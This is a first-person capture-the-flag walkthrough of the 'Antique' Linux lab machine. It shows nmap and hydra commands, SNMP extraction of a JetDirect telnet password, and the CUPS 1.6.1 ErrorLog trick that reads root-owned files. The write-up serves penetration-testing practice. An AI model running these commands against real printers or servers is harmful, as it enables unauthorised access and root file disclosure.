
>[!tldr] Antique is an easy Linux machine featuring a network printer disclosing credentials through #SNMP string which allows logging into telnet service. Foothold can be obtained by exploiting a feature in printer. #CUPS administration service running locally. This service can be exploited further to gain root access on the server.

1. First I ran `nmap <target> -A` to enumerate
```shell
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270:
|     JetDirect
|     Password:
|   NULL:
|_    JetDirect
1 service unrecognized despite returning data.
```
2. We have a `telnet` service and something with "JetDirect" which is most likely the printer. I tried a few common passwords `admin:admin`, `root:root` and `NULL`. But none of that worked.
3. I then searched online for methods to pentest telnet
	1. *Extracting NTLM Authentication Details* 
		1. `nmap -p 23 --script telnet-ntlm-info <target>`: - Though no useful output.
	2. *Banner Grabbing*
		1. `nc -nv <target> 23`: To find out what service is running and its version by looking at the welcome message it shows when you connect - It only shows a connect screen, though this is just the connection banner.
	3. *Passwordless Authentication*
		1. I joined and tried, `root, admin and lp` as the user without a password which did not work.
	4. *Brute Forcing*
		1. `nmap -p 23 --script telnet-brute <target>`: I tried brute forcing with a script from nmap, but i must've done something wrong since it stated "Statistics: Performed 0 guesses in 36 seconds, average tps: 0.0"
		2. `hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt -f telnet://<target>`: Using hydras top usernames and common passwords didnt work well since i have a really weak computer.
4. I decided to check out `UDP` since thats where `SNMP` is.
	1. `nmap <target> -sU` 
```shell
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
161/udp   open          snmp
502/udp   open|filtered mbap
5060/udp  open|filtered sip
16086/udp open|filtered unknown
23040/udp open|filtered unknown
29810/udp open|filtered unknown
32778/udp open|filtered sometimes-rpc20
49161/udp open|filtered unknown
49182/udp open|filtered unknown
```
- This is some good output, we know that `SNMP` is useful so we should scan port `161`
5. I then scanned port `161,162` which is the default ports for `SNMP` 
	1. `nmap <target> -p161,162 -sU`: 
```shell
PORT    STATE  SERVICE  VERSION
161/udp open   snmp     SNMPv1 server (public)
162/udp closed snmptrap
```
- Awesome! We now know that `SNMP` is version 1. 
6. Next research! 
	1. SNMP is "*a widely used protocol for network management that provides a standardized framework for monitoring and managing network devices such as ...**printers**...*" So we know that it can manage printers. cool, but its not enough, how is version 1 vulnerable?
	2. `Vuln-1:Plaintext`: "*community strings are transmitted in plaintext, making them highly susceptible to interception through sniffing attacks.*" Im not sure if we are intercepting any data...
		1. 
	3. `Vuln-2:Weak_Passwords`: "*With weak or default community strings, attackers can easily gain read or write access to network devices*" I could try brute forcing again with a password list designed for SNMP...
	4. `Vuln-3:Access_Control`: "*SNMPv1 and SNMPv2c do not provide robust access control mechanisms, allowing any user with the correct community string to access SNMP data*" Once we are in this will be a advantage!
	5. `Vuln-4:Reflection-Amplification_Attack`: DDoS attack, not applicable here...
	6. `Vuln-5:Misconfigured`: "*This includes improper setup of SNMP agents, leaving unnecessary MIBs (Management Information Bases) exposed...*" 
7. I know what to try using `snmpget` and `snmpwalk`, these are tools used for `SNMP`. 
	1. `snmpwalk -v1 -c Community 10.129.1.175`
		1. Output: `SNMPv2-SMI::mib-2 = STRING: "HTB Printer"` - I tried again with `-v2c` and that revealed the same output, something to keep in mind.
	2. `snmpget -v 1 -c public <Target> .1.3.6.1.4.1.11.2.3.9.1.1.13.0` 
		- I ended up finding a guide which referenced another website explaining how to get "a JetDirect password remotely using the SNMP vulnerability". 
		1. Output: `50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32` -> Converted from hex to plaintext -> `P @ s s w 0 r d @ 1 2 3 ! ! 1 2`
8. That definitely looks like a password, but trying it doesnt work. Maybe i have to remove the spaces
	1. `P@ssw0rd@123!!12` - but this didnt work either, im not sure what username i have to enter...
9. I ended up looking at the guide since the online hex to text converter messed me up big time!!! the actual password is  `P@ssw0rd@123!!123`
10. Anyways now we can login with `telnet <target>` and the *correct* password `P@ssw0rd@123!!123`. Once in i started running some commands
	1. `?`: To figure out more
	2. `exec ls -la`: to list files
		1. Output: `.bash_history -> /dev/null`, `telnet.py` and `user.txt`
	3. `exec cat user.txt` -> `[REDACTED_FLAG]` (*This is the flag located on "lp user's desktop"*)
11. Now we have to get into the root home directory, im assuming we need privilege escalation. 
	1. Enumeration
		1. `whoami`-> lp
		2. `id`-> uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
			- group 19 `lpadmin` could useful
		3. `uname -a`->Linux antique 5.13.0-051300-generic #202106272333
		4. `cat /etc/os-release`->Ubuntu 20.04.3 LTS
			- This version of Ubuntu is at least 3-4 years old, so plenty of vulnerabilities.
		5. `cat /etc/passwd | grep -v nologin | grep -v false`-> root:x:0:0:root:/root:/bin/bash
12. Before i go further i just remembered theres another file along with `user.txt` - the `telnet.py`. The password was in plaintext here, but also i have write permissions, i wonder if thatll be useful?
13. Back to enumeration
	1. Find all SUID binaries on the system->`find / -perm -4000 -type f 2>/dev/null`
```shell
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/authbind/helper
/usr/bin/mount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
```
- From here i'll start cross checking them with GTFObins
	1. `mount` was the first that lead to something, i input the command from GTFObins and got lots of output. But i dont think it worked
	2. `netstat -tlnp`
```shell
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1149/python3
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -
```
- We can try to enumerate these ip addresses
	3. `curl 0.0.0.0:23`-> nothing
	4. `curl 127.0.0.1:631`-> 
```html
<...snip...>
<TABLE CLASS="indent" SUMMARY="">
<TR><TD STYLE="padding-right: 20px;">

<H1>CUPS 1.6.1</H1>
<...snip...>
</HTML>
```
- I made this a `.html` file and opened it in my web for easier viewing. Its a `CUPS 1.6.1`, which is a "*CUPS is the standards-based, open source printing system developed by Apple Inc. for OS® X and other UNIX®-like operating systems.*" 
- From here i found a "Root File Read" on Metasploit for `CUPS 1.6.1`
14. I was getting stuck using metasploit so i asked ClaudeAI and it said that i could do the exploit manually which i opted for
	1. `exec cupsctl ErrorLog=/root/root.txt`
	2. `exec curl http://localhost:631/admin/log/error_log` -> `[REDACTED_FLAG]` Which is the root flag!